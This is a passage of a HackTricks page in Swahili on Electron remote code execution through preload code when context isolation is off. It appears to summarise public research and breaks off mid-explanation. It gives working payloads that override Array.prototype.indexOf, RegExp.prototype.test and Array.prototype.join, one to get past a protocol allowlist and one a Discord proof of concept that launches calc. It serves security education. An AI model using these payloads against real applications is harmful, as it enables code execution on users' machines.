# Electron contextIsolation RCE kupitia preload code

{{#include ../../../banners/hacktricks-training.md}}

## Mfano 1

Mfano kutoka [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)

Hii code inafungua viungo vya http(s) na kivinjari cha kawaida:

![](<../../../images/image (768).png>)

Kitu kama `file:///C:/Windows/systemd32/calc.exe` kinaweza kutumika kuendesha calc, `SAFE_PROTOCOLS.indexOf` inazuia hilo.

Hivyo, mshambuliaji anaweza kuingiza hii JS code kupitia XSS au urambazaji wa ukurasa wa kiholela:
```html
<script>
Array.prototype.indexOf = function () {
return 1337
}
</script>
```
Kama wito wa `SAFE_PROTOCOLS.indexOf` utarudisha 1337 kila wakati, mshambuliaji anaweza kupita ulinzi na kutekeleza calc. Hatua ya mwisho ya kutumia:
```html
<script>
Array.prototype.indexOf = function () {
return 1337
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
Angalia slaidi za asili kwa njia nyingine za kutekeleza programu bila kuwa na dirisha linalouliza ruhusa.

Kwa apparently, njia nyingine ya kupakia na kutekeleza msimbo ni kufikia kitu kama `file://127.0.0.1/electron/rce.jar`

## Mfano wa 2: Discord App RCE

Mfano kutoka [https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)

Wakati wa kuangalia skripti za preload, niligundua kuwa Discord inatoa kazi, ambayo inaruhusu baadhi ya moduli zinazoruhusiwa kuitwa kupitia `DiscordNative.nativeModules.requireModule('MODULE-NAME')`, kwenye ukurasa wa wavuti.\
Hapa, sikuweza kutumia moduli ambazo zinaweza kutumika kwa RCE moja kwa moja, kama moduli ya _child_process_, lakini **nilipata msimbo ambapo RCE inaweza kupatikana kwa kubadilisha mbinu za ndani za JavaScript** na kuingilia kati utekelezaji wa moduli iliyofichwa.

Ifuatayo ni PoC. Niliweza kuthibitisha kwamba programu ya **calc** inajitokeza wakati n**inapoitwa kazi ya `getGPUDriverVersions`** ambayo imefafanuliwa katika moduli inayoitwa "_discord_utils_" kutoka devTools, wakati **nikibadilisha `RegExp.prototype.test` na `Array.prototype.join`**.
```javascript
RegExp.prototype.test = function () {
return false
}
Array.prototype.join = function () {
return "calc"
}
DiscordNative.nativeModules
.requireModule("discord_utils")
.getGPUDriverVersions()
```
Funguo la `getGPUDriverVersions` inajaribu kutekeleza programu kwa kutumia maktaba ya "_execa_", kama ifuatavyo:
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== "win32") {
return {}
}

const result = {}
const nvidiaSmiPath = `${process.env["ProgramW6432"]}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []))
} catch (e) {
result.nvidia = { error: e.toString() }
}

return result
}
```
Kawaida _execa_ inajaribu kutekeleza "_nvidia-smi.exe_", ambayo imeainishwa katika mabadiliko ya `nvidiaSmiPath`, hata hivyo, kutokana na `RegExp.prototype.test` na `Array.prototype.join` zilizobadilishwa, **hoja inabadilishwa kuwa "**_**calc**_**" katika \_execa**\_**'s internal processing**.

Haswa, hoja inabadilishwa kwa kubadilisha sehemu mbili zifuatazo.
